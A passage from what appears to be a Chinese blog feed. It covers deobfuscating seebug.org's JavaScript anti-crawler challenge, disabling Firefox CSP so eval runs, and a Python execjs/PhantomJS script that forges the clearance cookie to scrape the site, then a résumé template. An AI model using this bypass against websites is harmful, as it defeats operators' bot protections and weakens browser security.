26;&#125;&#125;)())&#123;10.53(&#x27;2e&#x27;,50,26)&#125;3j&#123;10.g(&#x27;2&#x27;,50)&#125;&quot;</span>,f=<span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;<span class="keyword">var</span> a=<span class="number">0</span>,b=<span class="number">0</span>,c=<span class="number">0</span>;x=x.split(<span class="string">&quot;&quot;</span>);y=y||<span class="number">99</span>;<span class="keyword">while</span>((a=x.shift())&amp;&amp;(b=a.charCodeAt(<span class="number">0</span>)-<span class="number">77.5</span>))c=(<span class="built_in">Math</span>.abs(b)&lt;<span class="number">13</span>?(b+<span class="number">48.5</span>):<span class="built_in">parseInt</span>(a,<span class="number">36</span>))+y*c;<span class="keyword">return</span> c&#125;,z=f(y.match(<span class="regexp">/\w/g</span>).sort(<span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;<span class="keyword">return</span> f(x)-f(y)&#125;).pop());<span class="keyword">while</span>(z++)<span class="keyword">try</span>&#123;<span class="built_in">eval</span>(y.replace(<span class="regexp">/\b\w+\b/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">y</span>)</span>&#123;<span class="keyword">return</span> x[f(y,z)-<span class="number">1</span>]||(<span class="string">&quot;_&quot;</span>+y)&#125;));<span class="keyword">break</span>&#125;<span class="keyword">catch</span>(_)&#123;&#125;&lt;/script&gt;  </span><br></pre></td></tr></table></figure><h4 id="2-代码格式化（美化）"><a href="#2-代码格式化（美化）" class="headerlink" title="2.代码格式化（美化）"></a>2.代码格式化（美化）</h4><p>感觉是JS代码，使用<a href="https://www.html.cn/tool/js_beautify/">https://www.html.cn/tool/js_beautify/</a> 格式化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="string">&quot;firstChild@onreadystatechange@__p@02@@@@window@@@innerHTML@@@g@GMT@attachEvent@@4@@@document@setTimeout@pathname@try@Ss@@@@@var@rOm9XFMtA3QKV7nYsPGT4lifyWwkq5vcjH2IdxUoCbhERLaz81DNB6@@function@e@@captcha@@@36@@3@@1585820033@return@@l@reverse@false@search@@33@d@1500@8@0@DOMContentLoaded@@length@0xFF@@10@@Apr@477@o@f@@replace@https@@@as@@5@href@for@String@charAt@split@charCodeAt@@else@Path@@53@2@RegExp@toLowerCase@Expires@location@Array@20@0xEDB88320@new@@join@while@JgSe0upZ@@@__jsl_clearance@challenge@Thu@@@a@@addEventListener@parseInt@G@toString@1@NO@@hantom@createElement@substr@match@cookie@fromCharCode@catch@@chars@eval@div@@@if&quot;</span>.replace(<span class="regexp">/@*$/</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;@&quot;</span>),</span><br><span class="line">        y = <span class="string">&quot;19 50=1c()&#123;11(&#x27;46.3c=46.12+46.27.35(/[\\?|&amp;]1f-4i/,\\&#x27;\\&#x27;)&#x27;,2b);10.5e=&#x27;4h=21.31|2d|&#x27;+(1c()&#123;19 6=[1c(50)&#123;22 50&#125;,1c(6)&#123;22 6&#125;,1c(50)&#123;22 5j(&#x27;3e.5f(&#x27;+50+&#x27;)&#x27;)&#125;],1j=[(-~~~&#x27;&#x27;+[]+[])+[-~&#123;&#125;+(-~&#123;&#125;+[~~&#x27;&#x27;])/[-~&#123;&#125;-~&#123;&#125;]],[(-~&#123;&#125;+[~~&#x27;&#x27;])/[42]],[-~(+!-[])]+(((+!-[])|-~&#123;&#125;-~&#123;&#125;)+[]+[]),(~~&#123;&#125;+[]+[]),(-~&#123;&#125;-~&#123;&#125;+3b+[]),[-~(+!-[])]+(-~~~&#x27;&#x27;+[]+[]),(-~~~&#x27;&#x27;+[]+[])+[-~(+!-[])],[i-~(+!-[])-~[-~&#123;&#125;-~&#123;&#125;]],(-~~~&#x27;&#x27;+[]+[])+[i-~(+!-[])-~[-~&#123;&#125;-~&#123;&#125;]],(((+!-[])|-~&#123;&#125;-~&#123;&#125;)+[]+[]),(-~~~&#x27;&#x27;+[]+[])+(((+!-[])|-~&#123;&#125;-~&#123;&#125;)+[]+[]),(-~~~&#x27;&#x27;+[]+[])+[-~((-~~~&#x27;&#x27;+[-~(+!-[])]&gt;&gt;-~(+!-[])))],[-~(+!-[])]+[-~(+!-[])],[-~(+!-[])]+[-~&#123;&#125;+(-~&#123;&#125;+[~~&#x27;&#x27;])/[-~&#123;&#125;-~&#123;&#125;]],(-~~~&#x27;&#x27;+[]+[])+(2c+[]),[-~&#123;&#125;+(-~&#123;&#125;+[~~&#x27;&#x27;])/[-~&#123;&#125;-~&#123;&#125;]],[-~(+!-[])]+(~~&#123;&#125;+[]+[]),(-~~~&#x27;&#x27;+[]+[])+(-~~~&#x27;&#x27;+[]+[]),[-~(+!-[])]+[-~((-~~~&#x27;&#x27;+[-~(+!-[])]&gt;&gt;-~(+!-[])))],[-~((-~~~&#x27;&#x27;+[-~(+!-[])]&gt;&gt;-~(+!-[])))],(-~~~&#x27;&#x27;+[]+[])+[(-~&#123;&#125;+[~~&#x27;&#x27;])/[42]],(-~~~&#x27;&#x27;+[]+[])+(-~&#123;&#125;-~&#123;&#125;+3b+[]),(-~~~&#x27;&#x27;+[]+[])+(~~&#123;&#125;+[]+[]),(-~~~&#x27;&#x27;+[]+[]),[-~(+!-[])]+[(-~&#123;&#125;+[~~&#x27;&#x27;])/[42]],(2c+[]),[-~(+!-[])]];3d(19 50=2d;50&lt;1j.2g;50++)&#123;1j[50]=6[[57,2d,57,2d,57,42,57,2d,42,2d,42,2d,57,2d,42,57,42,57,2d,57,42,2d,57,2d,42,2d,42][50]]([(!-&#123;&#125;+[]+[]).3f(-~(+!-[])),(~~&#123;&#125;+[]+[]),[[-~&#123;&#125;+(-~&#123;&#125;+[~~&#x27;&#x27;])/[-~&#123;&#125;-~&#123;&#125;]]+(2c+[])],[(+!/!/)/(+!/!/)+[]+[]][2d].3f((-~~~&#x27;&#x27;&lt;&lt;-~~~&#x27;&#x27;))+[-~&#123;&#125;+(-~&#123;&#125;+[~~&#x27;&#x27;])/[-~&#123;&#125;-~&#123;&#125;]],&#x27;55&#x27;,[i-~(+!-[])-~[-~&#123;&#125;-~&#123;&#125;]],&#x27;42&#x27;,&#x27;58&#x27;,(((+!-[])|-~&#123;&#125;-~&#123;&#125;)+[]+[]),[&#123;&#125;+[[]][2d]][2d].3f((-~(+!-[])&lt;&lt;-~(+!-[]))),&#x27;2d&#x27;,&#x27;14&#x27;,&#x27;32&#x27;,[(2c+[])+[i-~(+!-[])-~[-~&#123;&#125;-~&#123;&#125;]]],(!-&#123;&#125;+[]+[]).3f(-~(+!-[])),[(-~~~&#x27;&#x27;+[]+[])+(~~&#123;&#125;+[]+[])+(((+!-[])|-~&#123;&#125;-~&#123;&#125;)+[]+[])],&#x27;1k&#x27;,[(-~&#123;&#125;+[~~&#x27;&#x27;])/[42]]+[(+!-[])/~~[]+[]+[]][2d].3f(-~!!8[&#x27;3&#x27;+&#x27;5a&#x27;+&#x27;39&#x27;]),[(((+!-[])|-~&#123;&#125;-~&#123;&#125;)+[]+[])+(-~&#123;&#125;-~&#123;&#125;+3b+[])],[(-~~~&#x27;&#x27;+[]+[])+(-~~~&#x27;&#x27;+[]+[])+(2c+[])],[(-~&#123;&#125;-~&#123;&#125;+3b+[])+(~~&#123;&#125;+[]+[]),(-~~~&#x27;&#x27;+[]+[])+(~~&#123;&#125;+[]+[])+[i-~(+!-[])-~[-~&#123;&#125;-~&#123;&#125;]]],[(-~&#123;&#125;-~&#123;&#125;+3b+[])+[(-~&#123;&#125;+[~~&#x27;&#x27;])/[42]]],&#x27;1k&#x27;,&#x27;24&#x27;,[!!8[&#x27;3&#x27;+&#x27;5a&#x27;+&#x27;39&#x27;]+[]+[]][2d].3f(((+!-[])|-~&#123;&#125;-~&#123;&#125;)),[(((+!-[])|-~&#123;&#125;-~&#123;&#125;)+[]+[])+(-~&#123;&#125;-~&#123;&#125;+3b+[])],[&#123;&#125;+[[]][2d]][2d].3f((-~(+!-[])&lt;&lt;-~(+!-[])))][1j[50]])&#125;;22 1j.4c(&#x27;&#x27;)&#125;)()+&#x27;;45=4j, 4-30-48 2j:29:41 f;3k=/;&#x27;&#125;;62((1c()&#123;13&#123;22 !!8.53;&#125;5g(1d)&#123;22 26;&#125;&#125;)())&#123;10.53(&#x27;2e&#x27;,50,26)&#125;3j&#123;10.g(&#x27;2&#x27;,50)&#125;&quot;</span>,</span><br><span class="line">        f = <span class="function"><span class="keyword">function</span> (<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> a = <span class="number">0</span>,</span><br><span class="line">                b = <span class="number">0</span>,</span><br><span class="line">                c = <span class="number">0</span>;</span><br><span class="line">            x = x.split(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            y = y || <span class="number">99</span>;</span><br><span class="line">            <span class="keyword">while</span> ((a = x.shift()) &amp;&amp; (b = a.charCodeAt(<span class="number">0</span>) - <span class="number">77.5</span>)) c = (<span class="built_in">Math</span>.abs(b) &lt; <span class="number">13</span> ? (b + <span class="number">48.5</span>) : <span class="built_in">parseInt</span>(a, <span class="number">36</span>)) + y * c;</span><br><span class="line">            <span class="keyword">return</span> c</span><br><span class="line">        &#125;,</span><br><span class="line">        z = f(y.match(<span class="regexp">/\w/g</span>).sort(<span class="function"><span class="keyword">function</span> (<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> f(x) - f(y)</span><br><span class="line">        &#125;).pop());</span><br><span class="line">    <span class="keyword">while</span> (z++) <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">eval</span>(y.replace(<span class="regexp">/\b\w+\b/g</span>, <span class="function"><span class="keyword">function</span> (<span class="params">y</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> x[f(y, z) - <span class="number">1</span>] || (<span class="string">&quot;_&quot;</span> + y)</span><br><span class="line">        &#125;));</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (_) &#123;&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>很明显返回的内容只是一段JS代码，但毫无头绪，跳过。</p><h4 id="3-分析"><a href="#3-分析" class="headerlink" title="3.分析"></a>3.分析</h4><p>使用浏览器对网站发起正常请求，Fiddler抓包，发现返回有两个包，浏览器对于同一网页连续访问了两次，第一次的访问状态码为521，第二次为200（正常访问）。看来网页加了反爬虫机制，需要两次访问才可返回正常网页。</p><p>下面我们来对比两次请求的区别：</p><p><strong>521请求：</strong></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424004819.jpg" alt="seebug 521"></p><p><strong>200请求：</strong></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424004826.jpg" alt="seebug 200"></p><p>通过对比两次请求头，我们发现第二次访问带了新的cookie值。再考虑上面程序对爬取结果的输出为js代码，可以考虑其操作过程为：第一次访问时服务器返回一段可动态生成cookie值的js代码；浏览器运行js代码生成cookie值，并带cookie重新进行访问；服务器被正常访问，返回页面信息，浏览器渲染加载。</p><h4 id="4-解析"><a href="#4-解析" class="headerlink" title="4.解析"></a>4.解析</h4><p>先分析cookie值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">设置：Set-Cookie: __jsluid_s&#x3D;669f5e06a3b3f2fd2679ef2f4ca91ce6; max-age&#x3D;31536000; path&#x3D;&#x2F;; HttpOnly; secure</span><br><span class="line"> </span><br><span class="line">最后需要的：Cookie: __jsluid_s&#x3D;669f5e06a3b3f2fd2679ef2f4ca91ce6; __jsl_clearance&#x3D;1584607180.68|0|b9aYrP21LoBfBNdYNlcLmJlEhbI%3D</span><br></pre></td></tr></table></figure><p>状态码521时设置了cookie(Set-Cookie),再次发起请求时Cookie又有点不一样了，多了一个__jsl_clearance。其中__jsluid_s在发起请求时我们可以轻松拿到，__jsl_clearance=1584607180.68|0|b9aYrP21LoBfBNdYNlcLmJlEhbI%3D，其中第一截凭感觉像是时间戳,第二截0，第三截看不出来，但是从%3D我们大致可以知道，可能是经过URL编码。没有办法，我们需要对之前获取到的JS代码进行处理。</p><p>在控制台输入eval=&gt;console.log()以及先前的JS脚本，打印得到</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424004726.PNG" alt="seebug 控制台执行js脚本"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;var _6=function()&#123;setTimeout(&#x27;location.href=location.pathname+location.search.replace(/[\\?|&amp;]captcha-challenge/,\\&#x27;\\&#x27;)&#x27;,1500);document.cookie=&#x27;__jsl_clearance=1585873652.093|0|&#x27;+(function()&#123;var _6=[0],_6a,_71,_1f=&#x27;&#x27;,chars=&#x27;JgSe0upZ%%rOm9XFMtA3QKV7nYsPGT4lifyWwkq5vcjH2IdxUoCbhERLaz81DNB6&#x27;,f=function(_71)&#123;for(var _6a=0;_6a&lt;8;_6a++)_71=(_71&amp;1)?(0xEDB88320^(_71&gt;&gt;&gt;1)):(_71&gt;&gt;&gt;1);return _71&#125;;while(_1f=_6.join().replace(new RegExp(&#x27;\\\\d+&#x27;,&#x27;g&#x27;),function(d)&#123;return chars.charAt(d)&#125;).split(&#x27;,&#x27;).join(&#x27;&#x27;)+&#x27;XwHBQ8xgJgaa6ez41yaEaAgtk%3D&#x27;)&#123;_71=-1;for(_6a=0;_6a&lt;_1f.length;_6a++)_71=(_71&gt;&gt;&gt;8)^f((_71^_1f.charCodeAt(_6a))&amp;0xFF);if((((-~[]&lt;&lt;-~[(+!!![][[]])+(+!!![][[]])])+[[]][0])+((-~[]&lt;&lt;-~[(+!!![][[]])+(+!!![][[]])])+[[]][0])+[-~![]+[~~[]]-(-~![])]+[((+!!![][[]])+[(-~[]&lt;&lt;(-~(+[])&lt;&lt;-~(+[])))]&gt;&gt;(+!!![][[]]))]+[((+!!![][[]])+[(-~[]&lt;&lt;(-~(+[])&lt;&lt;-~(+[])))]&gt;&gt;(+!!![][[]]))]+[(+!!![][[]])+(2^-~[])]+((-~(+[])&lt;&lt;-~(+[]))+[]+[[]][0])+(-~&#123;&#125;+(-~(+[])&lt;&lt;-~(+[]))+[]+[])+((-~[]&lt;&lt;-~[(+!!![][[]])+(+!!![][[]])])+[[]][0]))==(_71^(-1))&gt;&gt;&gt;0)return _1f;_6a=0;while(++_6[_6a]===chars.length)&#123;_6[_6a++]=0;if(_6a===_6.length)_6[_6a]=-1&#125;&#125;&#125;)()+&#x27;;Expires=Fri, 03-Apr-20 01:27:32 GMT;Path=/;&#x27;&#125;;if((function()&#123;try&#123;return !!window.addEventListener;&#125;catch(e)&#123;return false;&#125;&#125;)())&#123;document.addEventListener(&#x27;DOMContentLoaded&#x27;,_6,false)&#125;else&#123;document.attachEvent(&#x27;onreadystatechange&#x27;,_6)&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>细分析，查看参数和函数等，其中看到了我们需要的__jsl_clearance参数， 再次控制台打印，结果：</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424004733.PNG" alt="seebug cookie"></p><p>我们需要的cookie值已经拿到了，最后，我们只需要通过代码实现就可以了。</p><p><strong>PS：</strong></p><p>eval=&gt;console.log(),在控制台输入加打印,遇到错误</p><p>EvalError: call to eval() blocked by CSP</p><p>解决方法：<br>要使得eval函数可以运行，可以设置firefox的参数，禁用CSP相关设置即可。</p><p>首先，在地址栏输入about:config</p><p>然后在打开的选项页面上边搜索框输入CSP，搜索所有和Content Security Policy有关的设置项。</p><p>找到一个security.csp.enable，右键点击切换，从默认true修改为false。或者双击修改。</p><p>然后再次F12打开开发者工具栏，从控制台尝试运行eval函数，发现成功了。</p><p><strong>5.代码实现访问</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.environ[<span class="string">&quot;EXECJS_RUNTIME&quot;</span>] = <span class="string">&quot;PhantomJS&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="comment"># &#x27;User-Agent&#x27;:  random.choice(UA),</span></span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:65.0) Gecko/20100101 Firefox/65.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.seebug.org/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;www.seebug.org&#x27;</span>,</span><br><span class="line">    <span class="comment"># &#x27;Connection&#x27;:&#x27;keep-alive&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">js_html = requests.get(<span class="string">&#x27;https://www.seebug.org/&#x27;</span>)</span><br><span class="line">print(js_html.text)</span><br><span class="line">print(js_html.status_code)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCookie</span>():</span></span><br><span class="line">    res = requests.get(url=<span class="string">&quot;https://www.seebug.org/&quot;</span>,headers=headers)</span><br><span class="line">    cookie_dict = requests.utils.dict_from_cookiejar(res.cookies)</span><br><span class="line">    <span class="comment"># print(cookie_dict)</span></span><br><span class="line">    res.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">    jsCode1 = re.findall(<span class="string">&#x27;&lt;script&gt;(.*?)&lt;/script&#x27;</span>,res.text,re.S)</span><br><span class="line">    <span class="comment"># print(jsCode1)</span></span><br><span class="line">    <span class="keyword">if</span> jsCode1:</span><br><span class="line">        jsCode = jsCode1[<span class="number">0</span>]</span><br><span class="line">        jsCode = jsCode.replace(<span class="string">&quot;eval(&quot;</span>,<span class="string">&quot;var mNeed=(&quot;</span>)</span><br><span class="line">        ctx = execjs.<span class="built_in">compile</span>(jsCode)</span><br><span class="line">        mNeed = ctx.<span class="built_in">eval</span>(<span class="string">&quot;mNeed&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> mNeed:</span><br><span class="line">            lastJscode = re.findall(<span class="string">r&#x27;(cookie.*?Path=/;\&#x27;)&#x27;</span>,mNeed,re.S)</span><br><span class="line">            <span class="keyword">if</span> lastJscode:</span><br><span class="line">                cookieJs = <span class="string">&#x27;var &#x27;</span> + lastJscode[<span class="number">0</span>]</span><br><span class="line">                <span class="comment"># print(&quot;处理前&quot;,cookieJs)</span></span><br><span class="line">                <span class="comment"># textReplace = re.findall(r&#x27;(document.*?toLowerCase\(\))&#x27;,cookieJs)</span></span><br><span class="line">                <span class="comment"># if textReplace:</span></span><br><span class="line">                <span class="comment">#    cookieJs = &quot;var window=(&#125;;&quot;+cookieJs.replace(textReplace[0],&quot;www.seebug.org&quot;)</span></span><br><span class="line">                <span class="comment"># print(&quot;处理后&quot;,cookieJs)</span></span><br><span class="line">                ctx = execjs.<span class="built_in">compile</span>(cookieJs)</span><br><span class="line">                needPartCookie = ctx.<span class="built_in">eval</span>(<span class="string">&#x27;cookie&#x27;</span>)</span><br><span class="line">                part = needPartCookie.split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">                cookie_dict[part.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>]] = part.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span>  cookie_dict</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHtml</span>(<span class="params">cookie</span>):</span></span><br><span class="line">    res =  requests.get(url=<span class="string">&quot;https://www.seebug.org/&quot;</span>,headers=headers,cookies=cookie,verify=<span class="literal">False</span>)</span><br><span class="line">    res.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    print(res.text)</span><br><span class="line"></span><br><span class="line">cookie = getCookie()</span><br><span class="line">getHtml(cookie)</span><br></pre></td></tr></table></figure><p><strong>PS：</strong></p><p>遇到问题：execjs执行JS出现windows对象未定义 </p><p>解决方法：采用PhantomJS。</p><p>PhantomJS是什么？PhantomJS是一个基于webkit的JavaScript API。它使用QtWebKit作为它核心浏览器的功能，使用webkit来编译解释执行JavaScript代码。任何你可以在基于webkit浏览器做的事情，它都能做到。它不仅是个隐形的浏览器，提供了诸如CSS选择器、支持Web标准、DOM操作、JSON、HTML5、Canvas、SVG等，同时也提供了处理文件I/O的操作，从而使你可以向操作系统读写文件等。PhantomJS的用处可谓非常广泛，诸如网络监测、网页截屏、无需浏览器的 Web 测试、页面访问自动化等。</p><h4 id="6-成功获取网页数据"><a href="#6-成功获取网页数据" class="headerlink" title="6.成功获取网页数据"></a>6.成功获取网页数据</h4><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424004737.PNG" alt="成功访问seebug"></p><p>参考资料：</p><p><a href="http://blog.csdn.net/qq_36853469/article/details/105022598">http://blog.csdn.net/qq_36853469/article/details/105022598</a></p><p><a href="https://www.jianshu.com/p/37d549a4bf44">https://www.jianshu.com/p/37d549a4bf44</a></p><p><a href="https://blog.csdn.net/xx117501/article/details/102804286">https://blog.csdn.net/xx117501/article/details/102804286</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>技术简历编写</title>
      <link href="2020/04/02/2020-04-02-programmer_resume/"/>
      <url>2020/04/02/2020-04-02-programmer_resume/</url>
      
        <content type="html"><![CDATA[<h2 id="技术简历编写"><a href="#技术简历编写" class="headerlink" title="技术简历编写"></a>技术简历编写</h2><p>模板来源自<a href="http://cv.ftqq.com/">http://cv.ftqq.com</a></p><h1 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h1><p>（HR会打印你的简历，用于在面试的时候联系，所以联系方式放到最上边会比较方便）</p><ul><li>手机：135…. （如果是外地手机，可注明。如经常关机，要写上最优联系时间）</li><li>Email：<a href="mailto:&#x67;&#111;&#x6f;&#100;&#109;&#x61;&#x6e;&#64;&#103;&#x6d;&#x61;&#x69;&#x6c;&#46;&#x63;&#111;&#109;">&#x67;&#111;&#x6f;&#100;&#109;&#x61;&#x6e;&#64;&#103;&#x6d;&#x61;&#x69;&#x6c;&#46;&#x63;&#111;&#109;</a> （虽然我觉得QQ邮箱无所谓，不过有些技术人员比较反感，建议用G，非要用的话，不要用数字邮箱名）</li><li>QQ/微信号：6…（提供一个通过网络可以联系到你的方式）</li></ul><h1 id="个人信息"><a href="#个人信息" class="headerlink" title="个人信息"></a>个人信息</h1><ul><li><p>冷熊/男/1990 </p></li><li><p>本科/北极大学计算机系 </p></li><li><p>工作年限：3年</p></li><li><p>微博：<a href="http://weibo.com/easy">@Easy</a> （如果没有技术相关内容，也可以不放）</p></li><li><p>技术博客：<a href="http://old.ftqq.com/">http://old.ftqq.com</a> ( 使用GitHub Host的Big较高  )</p></li><li><p>Github：<a href="http://github.com/easychen">http://github.com/easychen</a> ( 有原创repo的Github帐号会极大的提升你的个人品牌  )</p></li><li><p>期望职位：PHP高级程序员，应用架构师</p></li><li><p>期望薪资：税前月薪15k~20k，特别喜欢的公司可例外</p></li><li><p>期望城市：北京</p></li></ul><h1 id="工作经历"><a href="#工作经历" class="headerlink" title="工作经历"></a>工作经历</h1><p>（工作经历按逆序排列，最新的在最前边，按公司做一级分组，公司内按二级分组）</p><h2 id="ABC公司-（-2012年9月-2014年9月-）"><a href="#ABC公司-（-2012年9月-2014年9月-）" class="headerlink" title="ABC公司 （ 2012年9月 ~ 2014年9月 ）"></a>ABC公司 （ 2012年9月 ~ 2014年9月 ）</h2><h3 id="DEF项目"><a href="#DEF项目" class="headerlink" title="DEF项目"></a>DEF项目</h3><p>我在此项目负责了哪些工作，分别在哪些地方做得出色/和别人不一样/成长快，这个项目中，我最困难的问题是什么，我采取了什么措施，最后结果如何。这个项目中，我最自豪的技术细节是什么，为什么，实施前和实施后的数据对比如何，同事和领导对此的反应如何。</p><h3 id="GHI项目"><a href="#GHI项目" class="headerlink" title="GHI项目"></a>GHI项目</h3><p>我在此项目负责了哪些工作，分别在哪些地方做得出色/和别人不一样/成长快，这个项目中，我最困难的问题是什么，我采取了什么措施，最后结果如何。这个项目中，我最自豪的技术细节是什么，为什么，实施前和实施后的数据对比如何，同事和领导对此的反应如何。</p><h3 id="其他项目"><a href="#其他项目" class="headerlink" title="其他项目"></a>其他项目</h3><p>（每个公司写2~3个核心项目就好了，如果你有非常大量的项目，那么按分类进行合并，每一类选一个典型写出来。其他的一笔带过即可。）</p><h2 id="JKL公司-（-2010年3月-2012年8月-）"><a href="#JKL公司-（-2010年3月-2012年8月-）" class="headerlink" title="JKL公司 （ 2010年3月 ~ 2012年8月 ）"></a>JKL公司 （ 2010年3月 ~ 2012年8月 ）</h2><h3 id="MNO项目"><a href="#MNO项目" class="headerlink" title="MNO项目"></a>MNO项目</h3><p>我在此项目负责了哪些工作，分别在哪些地方做得出色/和别人不一样/成长快，这个项目中，我最困难的问题是什么，我采取了什么措施，最后结果如何。这个项目中，我最自豪的技术细节是什么，为什么，实施前和实施后的数据对比如何，同事和领导对此的反应如何。</p><h3 id="PQR项目"><a href="#PQR项目" class="headerlink" title="PQR项目"></a>PQR项目</h3><p>我在此项目负责了哪些工作，分别在哪些地方做得出色/和别人不一样/成长快，这个项目中，我最困难的问题是什么，我采取了什么措施，最后结果如何。这个项目中，我最自豪的技术细节是什么，为什么，实施前和实施后的数据对比如何，同事和领导对此的反应如何。</p><h3 id="其他项目-1"><a href="#其他项目-1" class="headerlink" title="其他项目"></a>其他项目</h3><p>（每个公司写2~3个核心项目就好了，如果你有非常大量的项目，那么按分类进行合并，每一类选一个典型写出来。其他的一笔带过即可。）</p><h1 id="开源项目和作品"><a href="#开源项目和作品" class="headerlink" title="开源项目和作品"></a>开源项目和作品</h1><p>（这一段用于放置工作以外的、可证明你的能力的材料）</p><h2 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h2><p>（对于程序员来讲，没有什么比Show me the code能有说服力了）</p><ul><li><a href="http://github.com/yourname/projectname">STU</a>：项目的简要说明，Star和Fork数多的可以注明</li><li><a href="http://github.com/yourname/projectname">WXYZ</a>：项目的简要说明，Star和Fork数多的可以注明</li></ul><h2 id="技术文章"><a href="#技术文章" class="headerlink" title="技术文章"></a>技术文章</h2><p>（挑选你写作或翻译的技术文章，好的文章可以从侧面证实你的表达和沟通能力，也帮助招聘方更了解你）</p><ul><li><a href="http://get.jobdeer.com/706.get">一个产品经理眼中的云计算：前生今世和未来</a></li><li><a href="http://get.jobdeer.com/343.get">来自HeroKu的HTTP API 设计指南(翻译文章)</a> （ 好的翻译文章可以侧证你对英文技术文档的阅读能力）</li></ul><h2 id="演讲和讲义"><a href="#演讲和讲义" class="headerlink" title="演讲和讲义"></a>演讲和讲义</h2><p>（放置你代表公司在一些技术会议上做过的演讲，以及你在公司分享时制作的讲义）</p><ul><li>2014架构师大会演讲：<a href="http://ftqq.com/">如何通过Docker优化内部开发</a></li><li>9月公司内部分享：<a href="http://ftqq.com/">云计算的前生今世</a></li></ul><h1 id="技能清单"><a href="#技能清单" class="headerlink" 